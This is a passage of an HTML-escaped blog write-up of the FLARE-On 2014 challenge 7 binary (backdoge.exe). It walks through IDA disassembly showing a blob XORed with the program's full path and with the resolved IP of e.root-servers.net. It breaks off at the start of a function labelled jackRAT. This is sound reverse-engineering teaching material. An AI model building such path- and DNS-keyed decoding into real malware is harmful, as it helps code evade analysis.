&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B52&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;edi&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;esi&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B54&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;xor&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;ecx&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #B58900&#34;&gt;ecx&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B56&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;test&lt;/span&gt;    &lt;span style=&#34;color: #B58900&#34;&gt;ebx&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #B58900&#34;&gt;ebx&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B58&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;jz&lt;/span&gt;      &lt;span style=&#34;color: #268BD2&#34;&gt;short&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;loc_401B83&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B5A&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;lea&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;ebx&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;ebx&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B60&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B60&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;loc_401B60&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt;                             &lt;span style=&#34;color: #586E75&#34;&gt;; CODE XREF: .text:00401B81j&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B60&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;eax&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0AAAAAAABh&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B65&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;mul&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;ecx&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B67&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;shr&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;edx&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;3&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B6A&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;lea&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;eax&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;edx&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;edx&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B6D&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;add&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;eax&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #B58900&#34;&gt;eax&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B6F&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;add&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;eax&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #B58900&#34;&gt;eax&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B71&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;edx&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #B58900&#34;&gt;ecx&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B73&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;sub&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;edx&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #B58900&#34;&gt;eax&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B75&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;al&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;edx&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;edi&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt;    &lt;span style=&#34;color: #586E75&#34;&gt;; Moving full path to al by character&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B78&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;xor&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;bl&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;ob&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;ecx&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;],&lt;/span&gt; &lt;span style=&#34;color: #B58900&#34;&gt;al&lt;/span&gt;    &lt;span style=&#34;color: #586E75&#34;&gt;; xor-ing full path with blob&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B7E&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;inc&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;ecx&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B7F&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;cmp&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;ecx&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #B58900&#34;&gt;ebx&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B81&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;jb&lt;/span&gt;      &lt;span style=&#34;color: #268BD2&#34;&gt;short&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;loc_401B60&lt;/span&gt; &lt;span style=&#34;color: #586E75&#34;&gt;; jump back up to xor the next char&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B83&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B83&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;loc_401B83&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt;                             &lt;span style=&#34;color: #586E75&#34;&gt;; CODE XREF: .text:00401B58j&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B83&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;sub_4017A0&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B88&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;sub_4018A0&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;We finished the first 10 functions, YAY. Now we see that the full path of binary is xor-ed with the blob. However, &lt;strong&gt;keep in mind that one of the checks compared full path with &lt;code&gt;backdoge.exe&lt;/code&gt;&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;


    

&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;Fullpath xor&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt; 
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;1&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;blob&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;xor(blob,&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;fullpath)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;
&lt;/p&gt;

&lt;h4 id=&#34;function-13-internet-rootz:94bf06dd1bee42f6b34a1ff79274f7e7&#34;&gt;Function 13 - Internet Rootz&lt;/h4&gt;

&lt;p&gt;


    

&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt; 
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;1
2
3
4
5
6&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B83&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;loc_401B83&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt;                             &lt;span style=&#34;color: #586E75&#34;&gt;; CODE XREF: .text:00401B58j&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B83&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;sub_4017A0&lt;/span&gt;       &lt;span style=&#34;color: #586E75&#34;&gt;; you are here&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B88&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;sub_4018A0&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B8D&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;ecx&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;esi&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;4&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B90&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;movzx&lt;/span&gt;   &lt;span style=&#34;color: #B58900&#34;&gt;edx&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #DC322F&#34;&gt;byte&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;ptr&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;ecx&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B93&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;bl&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;ob&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #B58900&#34;&gt;dl&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;Two more functions. We&amp;rsquo;re getting there.&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://parsiya.net/images/2014/flare/7-19.jpg&#34; alt=&#34;Fetching IP for e.root-servers.net&#34; title=&#34;Fetching IP for e.root-servers.net&#34; /&gt;&lt;/p&gt;

&lt;p&gt;We have seen this type of code. This function pushes &lt;code&gt;e.root-servers.net&lt;/code&gt; to stack and then calls &lt;code&gt;gethostbyname&lt;/code&gt; to retrieve its IP &lt;code&gt;192.203.230.10&lt;/code&gt;. If the result is not zero, &lt;code&gt;h_addrtype&lt;/code&gt; is checked for 2 (&lt;code&gt;AF_INET&lt;/code&gt;) and retrieved IP is converted into ASCII format.&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://parsiya.net/images/2014/flare/7-20.jpg&#34; alt=&#34;xor-ing IP with blob&#34; title=&#34;xor-ing IP with blob&#34; /&gt;&lt;/p&gt;

&lt;p&gt;The rest is pretty simple. &lt;code&gt;192.203.230.10&lt;/code&gt; is xor-ed with the blob.&lt;/p&gt;

&lt;p&gt;


    

&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;Fullpath xor&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt; 
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;1&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;blob&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;xor(blob,&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;192.203.230.10&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;
&lt;/p&gt;

&lt;h4 id=&#34;function-14-jackrat:94bf06dd1bee42f6b34a1ff79274f7e7&#34;&gt;Function 14 - jackRAT&lt;/h4&gt;

&lt;p&gt;


    

&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt; 
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;1
2
3
4
5
6&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B83&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;loc_401B83&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt;                             &lt;span style=&#34;color: #586E75&#34;&gt;; CODE XREF: .text:00401B58j&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B83&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;InternetRootz&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B88&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;sub_4018A0&lt;/span&gt;       &lt;span style=&#34;color: #586E75&#34;&gt;; you are here&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B8D&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;ecx&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;esi&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;4&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B90&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;movzx&lt;/span&gt;   &lt;span style=&#34;color: #B58900&#34;&gt;edx&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #DC322F&#34;&gt;byte&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;ptr&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;ecx&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B93&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;bl&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;ob&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #B58900&#34;&gt;dl&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;


    

&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;sub_4018A0&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt; 
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt; 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:004018&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A0&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;sub_4018A0&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;proc&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;near&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:004018&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A0&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:004018&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A0&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;push&lt;/span&gt;    &lt;span style=&#34;color: #B58900&#34;&gt;ebp&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:004018&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A1&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;ebp&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #B58900&#34;&gt;esp&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:004018&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A3&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;eax&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;1088h&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:004018&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A8&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;__alloca_probe&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:004018&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;AD&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;eax&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;___security_cookie&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:004018&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B2&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;xor&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;eax&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #B58900&#34;&gt;ebp&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:004018&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B4&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;ebp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;var_4&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;],&lt;/span&gt; &lt;span style=&#34;color: #B58900&#34;&gt;eax&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:004018&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B7&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;push&lt;/span&gt;    &lt;span style=&#34;color: #B58900&#34;&gt;ebx&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:004018&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B8&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;xor&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;ebx&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #B58900&#34;&gt;ebx&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:004018&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;BA&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;push&lt;/span&gt;    &lt;span style=&#34;color: #B58900&#34;&gt;ebx&lt;/span&gt;             &lt;span style=&#34;color: #586E75&#34;&gt;; dwFlags - 0x00&lt;/span&gt;
